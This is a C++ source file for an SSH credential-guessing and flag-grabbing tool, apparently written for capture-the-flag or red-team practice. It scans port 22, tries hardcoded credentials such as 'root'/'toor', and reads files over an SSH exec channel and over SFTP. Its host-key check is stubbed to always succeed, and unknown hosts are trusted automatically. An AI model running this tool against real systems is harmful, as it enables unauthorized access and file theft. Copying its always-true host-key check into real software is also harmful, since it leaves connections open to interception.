/* For authorized CTF/Red Team use only.
To fix the compile error on macOS with Homebrew-installed libssh (including SFTP support), ensure you install libssh with SFTP and use the correct include + library paths:
  brew install libssh
  g++ -std=c++11 -I/opt/homebrew/include -L/opt/homebrew/lib -lssh -o 22_ssh 22_ssh.cpp
*/

#include <iostream>
#include <string>
#include <vector>
#include <libssh/libssh.h>
#include <libssh/sftp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <thread>
#include <mutex>

bool verifyHostKey(const std::string& key) {
    return true;
}

bool enhancedVerifyHostKey(ssh_session session) {
    ssh_options_set(session, SSH_OPTIONS_HOSTKEYS, "rsa,dsa,ecdsa,ed25519");
    if (ssh_connect(session) != SSH_OK) return false;
    int state = ssh_session_is_known_server(session);
    if (state == SSH_KNOWN_HOSTS_OK) return true;
    if (state == SSH_KNOWN_HOSTS_UNKNOWN || state == SSH_KNOWN_HOSTS_NOT_FOUND) {
        ssh_key srv_pubkey = nullptr;
        if (ssh_get_server_publickey(session, &srv_pubkey) == SSH_OK) {
            if (ssh_session_update_known_hosts(session) == SSH_OK) {
                ssh_key_free(srv_pubkey);
                return true;
            }
            ssh_key_free(srv_pubkey);
        }
    }
    return false;
}

std::string captureFlag(ssh_session session) {
    static const std::vector<std::string> flagPaths = {"/flag","/home/ctf/flag.txt","/tmp/flag"};
    for (auto &path : flagPaths) {
        ssh_channel channel = ssh_channel_new(session);
        if (!channel) continue;
        if (ssh_channel_open_session(channel) != SSH_OK) {
            ssh_channel_free(channel);
            continue;
        }
        std::string cmd = "cat " + path;
        if (ssh_channel_request_exec(channel, cmd.c_str()) == SSH_OK) {
            char buffer[256];
            std::string result;
            int n;
            while ((n = ssh_channel_read(channel, buffer, sizeof(buffer), 0)) > 0) {
                result.append(buffer, n);
            }
            ssh_channel_close(channel);
            ssh_channel_free(channel);
            if (!result.empty()) return result;
        }
        ssh_channel_close(channel);
        ssh_channel_free(channel);
    }
    return "";
}

std::string captureFlagSFTP(ssh_session session) {
    sftp_session sftp = sftp_new(session);
    if (!sftp) return "";
    if (sftp_init(sftp) != SSH_OK) {
        sftp_free(sftp);
        return "";
    }
    std::vector<std::string> paths = {"/flag","/home/ctf/flag.txt","/tmp/flag"};
    for (auto &p : paths) {
        sftp_file file = sftp_open(sftp, p.c_str(), O_RDONLY, 0);
        if (!file) continue;
        char buf[256];
        std::string data;
        int bytes;
        while ((bytes = sftp_read(file, buf, sizeof(buf))) > 0) {
            data.append(buf, bytes);
        }
        sftp_close(file);
        if (!data.empty()) {
            sftp_free(sftp);
            return data;
        }
    }
    sftp_free(sftp);
    return "";
}

bool isSSHOpen(const std::string& ip) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(22);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    bool open = (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0);
    close(sock);
    return open;
}

void processTarget(const std::string& ip, const std::vector<std::pair<std::string,std::string>>& creds) {
    if (!isSSHOpen(ip)) return;
    ssh_session session = ssh_new();
    if (!session) return;
    ssh_options_set(session, SSH_OPTIONS_HOST, ip.c_str());
    if (!enhancedVerifyHostKey(session)) {
        ssh_free(session);
        return;
    }
    for (auto &c : creds) {
        if (ssh_userauth_password(session, c.first.c_str(), c.second.c_str()) == SSH_AUTH_SUCCESS) {
            std::string flag = captureFlag(session);
            if (flag.empty()) {
                flag = captureFlagSFTP(session);
            }
            if (!flag.empty()) {
                std::cout << "[*] Flag on " << ip << " (" << c.first << "): " << flag << std::endl;
            }
        }
    }
    ssh_disconnect(session);
    ssh_free(session);
}

int main() {
    std::string serverKey = "some_unverified_key";
    if(verifyHostKey(serverKey)) {
        std::cout << "Connected without proper verification.\n";
    }

    std::vector<std::string> targets = {"127.0.0.1"};
    std::vector<std::pair<std::string,std::string>> creds = {
        {"testuser","testpassword"},
        {"root","toor"}
    };

    std::vector<std::thread> threads;
    for (auto &ip : targets) {
        threads.push_back(std::thread([&ip, &creds]() {
            processTarget(ip, creds);
        }));
    }
    for (auto &t : threads) t.join();
    return 0;
}